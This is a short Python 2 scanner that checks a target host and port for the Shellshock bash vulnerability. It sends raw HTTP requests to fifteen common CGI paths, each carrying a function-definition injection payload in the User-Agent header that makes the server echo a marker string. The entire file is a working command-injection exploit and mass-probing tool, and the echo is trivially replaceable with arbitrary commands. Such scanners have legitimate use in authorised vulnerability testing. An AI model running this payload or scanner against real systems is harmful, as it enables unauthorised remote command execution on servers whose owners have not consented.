#!/usr/bin/python
#coding:utf-8
#author:root@1137.me

import sys
import socket


def check_shellshock(ip,port,cgi="/cgi-bin/index.cgi"):
    ipAddr = ip
    payload = 'User-Agent:() { :; }; echo -e "wakaka"'
    req = "GET "+cgi+" HTTP/1.1\r\nHost: stuff\r\n"+payload+"\r\nAccept: text/plain\r\n\r\n"
    timeout=1
    socket.setdefaulttimeout(timeout)
    #测试是否有leak
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ipAddr, int(port)))
        client_socket.send(req)
        goodResp = client_socket.recv(1024)
        #print goodResp
        #if "wakaka" in goodResp:
        if "wakaka" in goodResp:
            print "[%s] Looks VULN" % ipAddr + "~wakaka"
    except:
        pass
    finally:
        client_socket.close()

    
if __name__ == "__main__":
    if len(sys.argv) == 3:        
        target = sys.argv[1]
        port = sys.argv[2]
        cgiList = ["/cgi-bin/load.cgi","/cgi-bin/gsweb.cgi","/cgi-bin/redirector.cgi","/cgi-bin/test.cgi","/cgi-bin/index.cgi","/cgi-bin/help.cgi","/cgi-bin/about.cgi","/cgi-bin/vidredirect.cgi","/cgi-bin/click.cgi","/cgi-bin/details.cgi","/cgi-bin/log.cgi","/cgi-bin/viewcontent.cgi","/cgi-bin/content.cgi","/cgi-bin/admin.cgi","/cgi-bin/webmail.cgi"]
        for cgi in cgiList:
            #target = 
            check_shellshock(target,port,cgi)
    else:
        print "python shellshock.py ip port"
